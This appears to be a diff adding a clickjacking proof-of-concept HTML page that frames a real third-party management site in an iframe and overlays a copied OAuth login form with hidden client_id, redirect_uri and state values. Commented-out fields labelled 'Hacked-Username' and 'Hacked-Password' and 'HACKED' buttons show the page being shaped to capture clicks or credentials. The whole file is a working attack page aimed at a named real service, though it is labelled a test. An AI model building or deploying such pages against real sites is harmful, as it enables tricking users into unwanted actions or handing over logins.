@@ -1,0 +1,45 @@
+<html>
+<head>
+  <title>Clickjack test page</title>
+  <link rel="stylesheet" type="text/css" href="style.css">
+  <link rel="stylesheet" type="text/css" href="login.css">
+</head>
+<body>
+  <!-- <p>Website is vulnerable to clickjacking!</p> -->
+
+  <div class="holder">
+    <iframe class="frame" src="https://manager.videoplaza.com/"></iframe>
+    <div class="main container">
+        <div class="padding"></div>
+        <div path="login-screen">
+            <div class="login">
+                <div>
+                    <form role="form" class="form-inline" action="authorize" method="post" novalidate="">
+                        <input type="hidden" name="response_type" value="code"/>
+                        <input type="hidden" name="client_id" value="pulse-service"/>
+                        <input type="hidden" name="redirect_uri" value="http://manager.videoplaza.com/karbon/admin/_oauth2/token/redirect"/>
+                        <input type="hidden" name="scope" value=""/>
+                        <input type="hidden" name="state" value="eyJhbGciOiJkaXIiLCJlbmMiOiJBMTI4Q0JDLUhTMjU2In0..BxM-GBn-2ZheExJTRO_CQw.z6iZOVvewCZAXdhgALCuIoy-GBc4Z5ABII_EbVywx8cbZYjJKLw8pBtE49lX-vx-hZAWQg0062fAFvyoZ79jjmwwydzeArXPq7VZ1YwnmrjhNeNEVhkim3QAUVWewpxp6ij4VSxwWjDMVDcgBELB2cbJXxUOgcyPJG6PuKJycXNe2u3sD5Z0Dye_auevfKZTOAAykwVdH4KI1uV9-Cb8Ew.J1bBTHNVN_wWCxf1e9F1Rw"/>
+
+                        <!-- <div class="form-group">
+                            <input class="form-control" type="text" placeholder="Hacked-Username" path="username" name="username">
+                        </div>
+                        <div class="form-group">
+                            <input class="form-control" type="password" placeholder="Hacked-Password" path="password" name="password">
+                        </div>
+                        <div class="form-group">
+                            <button type="submit" class="btn btn-block pink-button">HACKED</button>
+                        </div> -->
+                    </form>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- <div class="hack">
+      <button class="button" onclick="myFunction()">HACKED</button>
+    </div> -->
+  </div>
+
+</body>
+</html>
